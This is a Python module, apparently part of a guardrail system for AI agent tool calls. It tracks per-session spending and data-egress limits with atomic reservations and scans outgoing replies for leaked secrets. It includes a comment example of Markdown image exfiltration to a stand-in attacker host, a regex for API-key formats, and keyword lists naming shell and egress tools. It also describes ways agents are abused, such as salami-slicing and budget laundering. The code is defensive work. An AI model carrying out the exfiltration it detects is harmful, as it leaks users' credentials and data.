"""
ContractGuard-X Module 4: Stateful Effect-Safe Execution & Atomic Ledger
Enforces canonical effect budgets across multi-turn sessions, supports idempotency key replay,
tracks ambiguous execution outcomes (UNKNOWN_PENDING_RECONCILIATION), and inspects output egress.
"""
from __future__ import annotations
import re
import time
import uuid
import threading
from enum import Enum
from typing import Dict, List, Any, Optional, Tuple
from pydantic import BaseModel, Field


class CanonicalEffectType(str, Enum):
    FUNDS_TRANSFER = "funds_transfer"
    EXTERNAL_DATA_EGRESS = "external_data_egress"
    FILE_MODIFICATION = "file_modification"
    SYSTEM_EXEC = "system_exec"
    READ_DATA = "read_data"


class ReservationStatus(str, Enum):
    PENDING = "PENDING"
    COMMITTED = "COMMITTED"
    REVERTED = "REVERTED"
    UNKNOWN_PENDING_RECONCILIATION = "UNKNOWN_PENDING_RECONCILIATION"


class EffectReservation(BaseModel):
    reservation_id: str
    idempotency_key: str
    session_id: str
    tool_name: str
    canonical_type: CanonicalEffectType
    delta_amount: float = 0.0
    effect_units: int = 1
    status: ReservationStatus = ReservationStatus.PENDING
    timestamp: float = Field(default_factory=time.time)
    metadata: Dict[str, Any] = Field(default_factory=dict)


class OutputInspectionResult(BaseModel):
    safe: bool
    modified_text: str
    violation_detected: Optional[str] = None
    redaction_count: int = 0


class StatefulEffectLedger:
    """
    Maintains session-level cumulative effect state with atomic reservation locking
    to stop multi-turn salami-slicing attacks, cross-tool data export abuse, and duplicate retries.
    Invariant #6: Atomic reservations cover pending, committed, and unknown_pending_reconciliation effects;
                  timeout does NOT release budget or imply non-execution.
    """

    ACTIVE_BUDGET_STATUSES = {
        ReservationStatus.PENDING,
        ReservationStatus.COMMITTED,
        ReservationStatus.UNKNOWN_PENDING_RECONCILIATION
    }

    def __init__(self):
        self._lock = threading.Lock()
        self._reservations: Dict[str, EffectReservation] = {}
        self._idempotency_index: Dict[str, str] = {}  # (session_id:idempotency_key) -> reservation_id

    def get_session_spent(self, session_id: str) -> float:
        """Returns total committed + pending + unknown_pending spend for a session."""
        with self._lock:
            total = 0.0
            for r in self._reservations.values():
                if r.session_id == session_id and r.status in self.ACTIVE_BUDGET_STATUSES:
                    total += r.delta_amount
            return total

    def get_session_effect_count(self, session_id: str, effect_type: CanonicalEffectType) -> int:
        """Returns cumulative count of a canonical effect type (e.g., EXTERNAL_DATA_EGRESS across email/upload)."""
        with self._lock:
            count = 0
            for r in self._reservations.values():
                if (
                    r.session_id == session_id
                    and r.canonical_type == effect_type
                    and r.status in self.ACTIVE_BUDGET_STATUSES
                ):
                    count += r.effect_units
            return count

    def extract_delta(self, tool_name: str, parameters: Dict[str, Any]) -> Tuple[CanonicalEffectType, float]:
        """Maps proposed tool call into a canonical effect type and financial delta."""
        t_low = tool_name.lower()
        # Financial tools
        if any(term in t_low for term in ["refund", "transfer", "pay", "spend", "withdraw", "wire"]):
            for key in ["amount", "value", "cost", "sum", "payment"]:
                if key in parameters:
                    try:
                        return CanonicalEffectType.FUNDS_TRANSFER, float(parameters[key])
                    except (ValueError, TypeError):
                        pass
            return CanonicalEffectType.FUNDS_TRANSFER, 0.0

        # Data egress tools (email, HTTP upload, webhook, post)
        if any(term in t_low for term in ["email", "upload", "webhook", "post", "send", "export"]):
            return CanonicalEffectType.EXTERNAL_DATA_EGRESS, 0.0

        # System execution
        if any(term in t_low for term in ["shell", "exec", "database", "format", "delete"]):
            return CanonicalEffectType.SYSTEM_EXEC, 0.0

        return CanonicalEffectType.READ_DATA, 0.0

    def reserve_atomic(
        self,
        session_id: str,
        tool_name: str,
        parameters: Dict[str, Any],
        max_budget: Optional[float] = 1000.0,
        idempotency_key: Optional[str] = None,
        max_external_transfers: Optional[int] = None,
        auto_commit: bool = True
    ) -> Tuple[bool, Optional[EffectReservation], str]:
        """
        Atomically checks if proposed action complies with cumulative session budget and effect limits.
        Supports idempotent retry deduplication: if the same idempotency_key is replayed, returns the
        existing reservation without double-counting the effect.
        """
        canonical_type, delta = self.extract_delta(tool_name, parameters or {})

        # Budget laundering prevention: negative effect deltas are prohibited in reservations
        if delta < 0:
            return False, None, "Negative effect deltas are prohibited (budget laundering prevention)."

        with self._lock:
            # 1. Idempotency replay check
            if idempotency_key:
                idx_key = f"{session_id}:{idempotency_key}"
                if idx_key in self._idempotency_index:
                    existing_res_id = self._idempotency_index[idx_key]
                    existing_res = self._reservations.get(existing_res_id)
                    if existing_res:
                        return True, existing_res, f"Idempotent replay recognized ({idempotency_key}); returning existing reservation without double charge."

            # 2. Compute current active spend & external transfer counts
            current_spent = 0.0
            current_egress_count = 0
            for r in self._reservations.values():
                if r.session_id == session_id and r.status in self.ACTIVE_BUDGET_STATUSES:
                    current_spent += r.delta_amount
                    if r.canonical_type == CanonicalEffectType.EXTERNAL_DATA_EGRESS:
                        current_egress_count += r.effect_units

            proposed_total = current_spent + delta

            # 3. Enforce cumulative financial ceiling
            if max_budget is not None and delta > 0 and proposed_total > max_budget:
                return False, None, (
                    f"Cumulative budget limit exceeded! "
                    f"Already committed/pending: ${current_spent:.2f}, Proposed delta: ${delta:.2f}, "
                    f"Resulting total: ${proposed_total:.2f} > Policy ceiling: ${max_budget:.2f}."
                )

            # 4. Enforce cross-tool external data egress count limit (Case E2)
            if (
                max_external_transfers is not None
                and canonical_type == CanonicalEffectType.EXTERNAL_DATA_EGRESS
                and (current_egress_count + 1) > max_external_transfers
            ):
                return False, None, (
                    f"Cross-tool external transfer limit exceeded! "
                    f"Already executed/pending: {current_egress_count}, Proposed: +1 > Ceiling: {max_external_transfers}."
                )

            # 5. Issue atomic reservation
            res_id = f"res_{uuid.uuid4().hex[:12]}"
            idem_key = idempotency_key or f"cgx_idem_{uuid.uuid4().hex[:16]}"
            initial_status = ReservationStatus.COMMITTED if auto_commit else ReservationStatus.PENDING
            reservation = EffectReservation(
                reservation_id=res_id,
                idempotency_key=idem_key,
                session_id=session_id,
                tool_name=tool_name,
                canonical_type=canonical_type,
                delta_amount=delta,
                status=initial_status
            )
            self._reservations[res_id] = reservation
            self._idempotency_index[f"{session_id}:{idem_key}"] = res_id
            return True, reservation, f"Atomic reservation approved. New cumulative total: ${proposed_total:.2f}/${max_budget if max_budget is not None else 'inf'}."

    def reconcile(
        self,
        reservation_id_or_session: str,
        reservation_id_opt: Optional[str] = None,
        observed_delta: Optional[float] = None,
        revert: bool = False,
        confirmed_executed: Optional[bool] = None
    ) -> bool:
        """Reconciles a pending reservation after actual tool execution completes."""
        res_id = reservation_id_opt if reservation_id_opt is not None else reservation_id_or_session
        if confirmed_executed is not None:
            revert = not confirmed_executed
        with self._lock:
            res = self._reservations.get(res_id)
            if not res:
                return False
            if revert:
                res.status = ReservationStatus.REVERTED
            else:
                if observed_delta is not None:
                    res.delta_amount = float(observed_delta)
                res.status = ReservationStatus.COMMITTED
            return True

    def mark_unknown_pending(
        self,
        reservation_id_or_session: str,
        reservation_id_opt: Optional[str] = None,
        reason: str = "Execution timeout / ambiguous network outcome"
    ) -> bool:
        """
        Invariant #6: When tool execution times out or returns an ambiguous network state,
        mark as UNKNOWN_PENDING_RECONCILIATION and keep budget locked (never auto-release or auto-retry).
        """
        res_id = reservation_id_opt if reservation_id_opt is not None else reservation_id_or_session
        with self._lock:
            res = self._reservations.get(res_id)
            if not res:
                return False
            res.status = ReservationStatus.UNKNOWN_PENDING_RECONCILIATION
            res.metadata["reconciliation_note"] = reason
            return True

    def reset_session(self, session_id: str) -> None:
        with self._lock:
            keys_to_del = [k for k, v in self._reservations.items() if v.session_id == session_id]
            for k in keys_to_del:
                idem = self._reservations[k].idempotency_key
                self._idempotency_index.pop(f"{session_id}:{idem}", None)
                del self._reservations[k]


class OutputGuard:
    """
    Inspects outgoing responses to prevent Markdown image exfiltration and confidential token egress.
    """

    MARKDOWN_IMAGE_PATTERN = re.compile(r"!\[(.*?)\]\((https?://[^\s\)]+)\)", re.IGNORECASE)
    SECRET_KEY_PATTERN = re.compile(r"(SEC_[A-Za-z0-9_]{6,}|sk-[A-Za-z0-9]{16,}|ghp_[A-Za-z0-9]{16,}|LEAKED_KEY[A-Za-z0-9_]*)", re.IGNORECASE)

    @classmethod
    def inspect(cls, response_text: str) -> OutputInspectionResult:
        if not response_text:
            return OutputInspectionResult(safe=True, modified_text="")

        modified = response_text
        violation = None
        redaction_count = 0

        # Check for Markdown image exfiltration (e.g. ![leak](https://attacker.site/track?token=...))
        image_matches = cls.MARKDOWN_IMAGE_PATTERN.findall(modified)
        if image_matches:
            violation = "Unauthorized Markdown Image Exfiltration Attempt"
            modified = cls.MARKDOWN_IMAGE_PATTERN.sub(r"[BLOCKED_IMAGE_EXFILTRATION: \1]", modified)
            redaction_count += len(image_matches)

        # Check for raw API keys or secrets
        secret_matches = cls.SECRET_KEY_PATTERN.findall(modified)
        if secret_matches:
            violation = violation or "Confidential Token / API Key Leakage"
            modified = cls.SECRET_KEY_PATTERN.sub(r"[REDACTED_API_KEY]", modified)
            redaction_count += len(secret_matches)

        return OutputInspectionResult(
            safe=(violation is None),
            modified_text=modified,
            violation_detected=violation,
            redaction_count=redaction_count
        )


stateful_ledger = StatefulEffectLedger()
output_guard = OutputGuard()
